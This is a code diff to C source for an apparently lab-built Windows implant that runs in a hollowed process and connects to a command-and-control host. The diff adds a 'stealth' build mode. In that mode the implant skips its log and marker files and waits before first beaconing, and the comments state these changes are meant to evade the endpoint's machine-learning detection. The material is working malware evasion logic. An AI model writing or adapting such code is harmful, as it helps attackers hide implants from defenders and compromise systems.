@@ -693,9 +693,16 @@ static void px_emit(const char *buf, px_size_t len)
     if (h != INVALID_HANDLE_VALUE && h != NULL)
         WriteFile(h, buf, (DWORD)len, &written, NULL);
 
+#if !PX_STEALTH
     /* A hollowed process is a GUI process with no console, so stdout may
      * be absent. Always mirror the log to a file next to the image so the
-     * run is observable no matter what the host process is. */
+     * run is observable no matter what the host process is.
+     *
+     * With PX_STEALTH the file is not written. A fresh binary that
+     * immediately creates a text file next to itself is one of the
+     * shapes the endpoint's machine-learning engine reads, and the log
+     * is not what the lab is measuring anyway -- the C2 audit log on
+     * the HOST is. */
     {
         char path[MAX_PATH];
         HANDLE f;
@@ -708,6 +715,9 @@ static void px_emit(const char *buf, px_size_t len)
             CloseHandle(f);
         }
     }
+#else
+    (void)written;
+#endif
 }
 
 static px_size_t px_utoa(unsigned long v, char *out)
@@ -1659,7 +1669,15 @@ __declspec(dllexport) void px_entry(void)
     PX_WSADATA wsa;
     unsigned int attempt = 0;
 
+#if !PX_STEALTH
+    /* The marker file.
+     *
+     * With PX_STEALTH this is not written. A fresh binary that creates a
+     * text file next to itself before it does anything else is one of
+     * the shapes the endpoint reads, and the marker is not what the lab
+     * is measuring -- the C2 audit log on the HOST is. */
     write_marker();
+#endif
 
     /* The protocol vocabulary.
      *
@@ -1738,11 +1756,30 @@ __declspec(dllexport) void px_entry(void)
         }
     }
 
+    #if !PX_STEALTH
     write_marker();
+#endif
+
+#if PX_STEALTH
+    /* The delay before the first connection.
+     *
+     * The other half of what the machine-learning engine reads is the
+     * shape "process started and immediately phoned home". A process
+     * that starts, does nothing for a while, and then connects is a
+     * different shape, and it is the same shape as every other program
+     * on a machine that starts at logon.
+     *
+     * The delay is BEFORE the first attempt only. Once the session is
+     * up, the reconnect backoff already handles the rest. */
+    if (PX_STEALTH_DELAY > 0) {
+        px_logf("[px] stealth delay: %u seconds\n",
+                (unsigned int)PX_STEALTH_DELAY);
+        Sleep((DWORD)PX_STEALTH_DELAY * 1000);
+    }
+#endif
 
     {
-        HMODULE hws;
-        hws = LoadLibraryA(g_vocab.ws2_32);
+        HMODULE hws;        hws = LoadLibraryA(g_vocab.ws2_32);
         if (!hws) {
             px_logf(g_vocab.log_ws_fail,
                     (unsigned long)GetLastError());
